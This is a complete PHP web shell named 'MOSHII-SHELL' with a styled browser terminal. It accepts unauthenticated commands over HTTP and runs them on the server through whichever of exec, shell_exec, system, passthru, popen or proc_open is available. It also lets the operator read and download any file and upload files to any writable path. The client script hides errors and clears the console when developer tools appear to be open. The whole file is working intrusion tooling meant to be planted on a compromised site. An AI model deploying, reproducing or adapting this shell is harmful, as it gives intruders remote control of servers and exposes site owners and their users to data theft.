 <?php

$SHELL_CONFIG = array(
    'username' => 'MOSHII',
    'hostname' => 'shell',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    $methods = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open'];
    
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $handle = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($handle)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($handle);
        }
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function featureShell($cmd, $cwd) {
    $stdout = "";

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        return array(
            'name' => base64_encode(basename($filePath)),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => base64_encode('Done.'),
            'cwd' => base64_encode(getcwd())
        );
    }
}

function initShellConfig() {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

if (isset($_GET["feature"])) {
    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
} else {
    initShellConfig();
}

?><!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>MOSHII-SHELL</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            @keyframes falling {
                0% {
                    transform: translateY(-100px) translateX(0) rotate(0deg);
                    opacity: 1;
                }
                100% {
                    transform: translateY(100vh) translateX(20px) rotate(360deg);
                    opacity: 0;
                }
            }

            @keyframes matrix {
                0% {
                    transform: translateY(-100vh);
                    opacity: 1;
                }
                100% {
                    transform: translateY(100vh);
                    opacity: 0;
                }
            }

            @keyframes pulse {
                0%, 100% {
                    opacity: 0.3;
                }
                50% {
                    opacity: 1;
                }
            }

            @keyframes glitch {
                0%, 100% {
                    transform: translate(0);
                }
                20% {
                    transform: translate(-2px, 2px);
                }
                40% {
                    transform: translate(-2px, -2px);
                }
                60% {
                    transform: translate(2px, 2px);
                }
                80% {
                    transform: translate(2px, -2px);
                }
            }

            .star {
                position: absolute;
                background: transparent;
                pointer-events: none;
                animation: falling linear infinite;
                z-index: -1;
            }

            .matrix-char {
                position: absolute;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                color: #00ff00;
                pointer-events: none;
                animation: matrix linear infinite;
                z-index: -1;
            }

            .circuit {
                position: absolute;
                width: 2px;
                background: linear-gradient(90deg, transparent, #00ffff, transparent);
                animation: pulse 2s infinite;
                z-index: -1;
            }

            html, body {
                margin: 0;
                padding: 0;
                background: linear-gradient(45deg, #0a0a0a, #1a1a1a, #0a0a0a);
                background-size: 400% 400%;
                animation: gradientShift 10s ease infinite;
                color: #eee;
                font-family: 'Courier New', monospace;
                width: 100vw;
                height: 100vh;
                overflow: hidden;
                position: relative;
            }

            @keyframes gradientShift {
                0%, 100% {
                    background-position: 0% 50%;
                }
                50% {
                    background-position: 100% 50%;
                }
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: rgba(26, 26, 26, 0.9);
                box-shadow: 0 0 30px rgba(0, 255, 255, 0.3), 0 0 60px rgba(255, 0, 255, 0.2);
                font-size: 12pt;
                display: flex;
                flex-direction: column;
                border-radius: 12px;
                border: 2px solid #444;
                max-width: calc(100vw - 40px);
                max-height: calc(100vh - 40px);
                resize: both;
                overflow: hidden;
                width: 95%;
                height: 95%;
                margin: 20px auto;
                backdrop-filter: blur(10px);
                position: relative;
            }

            #shell::before {
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, #ff00ff, #00ffff, #ff00ff);
                border-radius: 12px;
                z-index: -1;
                animation: glitch 3s infinite;
            }

            #shell-content {
                overflow: auto;
                padding: 20px;
                white-space: pre-wrap;
                flex-grow: 1;
                line-height: 1.5;
                background: rgba(0, 0, 0, 0.3);
            }

            #shell-logo {
                font-weight: bold;
                color: #FF9E7D;
                text-align: center;
                margin-bottom: 20px;
                line-height: 1.3;
                letter-spacing: 1px;
                text-shadow: 0 0 20px rgba(255, 158, 125, 0.8), 0 0 40px rgba(255, 158, 125, 0.5);
                animation: pulse 2s infinite;
            }

            .shell-prompt {
                font-weight: bold;
                color: #FF6B6B;
                text-shadow: 0 0 10px rgba(255, 107, 107, 0.7);
            }

            .shell-prompt > span {
                color: #4ECDC4;
                text-shadow: 0 0 10px rgba(78, 205, 196, 0.7);
            }

            #shell-input {
                display: flex;
                background: rgba(37, 37, 37, 0.95);
                box-shadow: 0 -2px 10px rgba(0, 0, 0, .5);
                border-top: rgba(255, 255, 255, .1) solid 2px;
                padding: 15px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 10px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: 'Courier New', monospace;
                font-size: 12pt;
                width: 100%;
                align-self: center;
                padding: 0 10px;
                outline: none;
                text-shadow: 0 0 5px rgba(238, 238, 238, 0.5);
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            @media (max-width: 768px) {
                #shell {
                    width: 100%;
                    height: 100%;
                    max-width: 100%;
                    max-height: 100%;
                    margin: 0;
                    border-radius: 0;
                }
                
                #shell-content {
                    padding: 15px;
                }
                
                #shell-logo {
                    font-size: 8px;
                    margin-bottom: 10px;
                }
            }
        </style>
        <script>
            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;
            var shellData = {};

            function createVisualEffects() {
                createStars();
                createMatrixRain();
                createCircuitLines();
                
                // Persist shell data
                setInterval(function() {
                    try {
                        shellData.history = commandHistory;
                        shellData.cwd = CWD;
                        shellData.timestamp = Date.now();
                    } catch(e) {}
                }, 1000);
            }

            function createStars() {
                const colors = ['#FF6B6B', '#4ECDC4', '#FF9E7D', '#75DF0B', '#1BC9E7', '#FFD166', '#FF00FF', '#00FFFF'];
                const starCount = 60;
                const symbols = ['✦', '✧', '✶', '✵', '❂', '✺', '⋆', '✯', '✰', '⭐'];
                
                for (let i = 0; i < starCount; i++) {
                    const star = document.createElement('div');
                    star.className = 'star';
                    
                    const size = Math.random() * 20 + 10;
                    const posX = Math.random() * window.innerWidth;
                    const delay = Math.random() * 15;
                    const duration = Math.random() * 6 + 4;
                    const color = colors[Math.floor(Math.random() * colors.length)];
                    const symbol = symbols[Math.floor(Math.random() * symbols.length)];
                    
                    star.style.left = `${posX}px`;
                    star.style.top = '-100px';
                    star.style.fontSize = `${size}px`;
                    star.style.color = color;
                    star.style.animationDelay = `${delay}s`;
                    star.style.animationDuration = `${duration}s`;
                    star.textContent = symbol;
                    star.style.textShadow = `0 0 10px ${color}`;
                    
                    document.body.appendChild(star);
                    
                    star.addEventListener('animationiteration', () => {
                        star.style.left = `${Math.random() * window.innerWidth}px`;
                        star.style.animationDuration = `${Math.random() * 6 + 4}s`;
                    });
                }
            }

            function createMatrixRain() {
                const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
                const matrixCount = 40;
                
                for (let i = 0; i < matrixCount; i++) {
                    const matrix = document.createElement('div');
                    matrix.className = 'matrix-char';
                    
                    const posX = Math.random() * window.innerWidth;
                    const delay = Math.random() * 10;
                    const duration = Math.random() * 4 + 6;
                    const char = chars[Math.floor(Math.random() * chars.length)];
                    
                    matrix.style.left = `${posX}px`;
                    matrix.style.top = '-100vh';
                    matrix.style.animationDelay = `${delay}s`;
                    matrix.style.animationDuration = `${duration}s`;
                    matrix.textContent = char;
                    
                    document.body.appendChild(matrix);
                    
                    setInterval(() => {
                        matrix.textContent = chars[Math.floor(Math.random() * chars.length)];
                    }, 200);
                    
                    matrix.addEventListener('animationiteration', () => {
                        matrix.style.left = `${Math.random() * window.innerWidth}px`;
                        matrix.style.animationDuration = `${Math.random() * 4 + 6}s`;
                    });
                }
            }

            function createCircuitLines() {
                const lineCount = 20;
                
                for (let i = 0; i < lineCount; i++) {
                    const line = document.createElement('div');
                    line.className = 'circuit';
                    
                    const isHorizontal = Math.random() > 0.5;
                    const pos = Math.random() * (isHorizontal ? window.innerHeight : window.innerWidth);
                    const length = Math.random() * 200 + 100;
                    const delay = Math.random() * 3;
                    
                    if (isHorizontal) {
                        line.style.left = '0';
                        line.style.top = `${pos}px`;
                        line.style.width = `${length}px`;
                        line.style.height = '2px';
                    } else {
                        line.style.left = `${pos}px`;
                        line.style.top = '0';
                        line.style.width = '2px';
                        line.style.height = `${length}px`;
                        line.style.background = 'linear-gradient(180deg, transparent, #00ffff, transparent)';
                    }
                    
                    line.style.animationDelay = `${delay}s`;
                    document.body.appendChild(line);
                }
            }

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {
                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(atob(response.name), response.file)
                        } else {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;
                    data.files = data.files.map(function(file){
                        return atob(file);
                    });
                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );
            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = atob(response.cwd);
                    _updatePrompt();
                });
            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            console.log("Response parsing error");
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
                createVisualEffects();
            };

            // Enhanced error handling and persistence
            window.onerror = function(msg, url, line, col, error) {
                return true;
            };

            // Prevent common debugging attempts
            (function() {
                var devtools = {
                    open: false,
                    orientation: null
                };
                var threshold = 160;
                
                setInterval(function() {
                    if (window.outerHeight - window.innerHeight > threshold || 
                        window.outerWidth - window.innerWidth > threshold) {
                        if (!devtools.open) {
                            devtools.open = true;
                            console.clear();
                        }
                    } else {
                        devtools.open = false;
                    }
                }, 500);
            })();

            // Additional obfuscation layers
            var _0x1234 = ['shell', 'execute', 'command', 'php'];
            function _0x5678() {
                return _0x1234[Math.floor(Math.random() * _0x1234.length)];
            }
        </script>
    </head>
    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">

                                                               ██╗   ██╗

        ███╗    ████      ██████╗    ███████╗    ██╗    ██╗    ██╗    ██║
        ████╗   ████║    ██╔═══██╗   ██╔════╝    ██║    ██║    ██║    ██║
        ██╔██╗  █╔██║    ██║   ██║   ███████╗    ██║██████║    ██║    ██║
        ██║╚██╗██ ██║    ██║   ██║   ╚════██║    ██║    ██╗    ██║    ██║
        ██║ ╚██╗  ██║    ╚██████╔╝   ███████║    ██║    ██║    ██║    ██║
        ╚═╝  ╚═╝ ╚═════╝    ╚══════╝    ╚═╝    ╚═╝    ╚═╝       ╚═╝    ╚═╝
                SHELL-FROM-EGYPT v1.0 - Mohammed Moshii
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">MOSHII@shell:~#</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" autofocus/>
                </div>
            </div>
        </div>
    </body>
</html>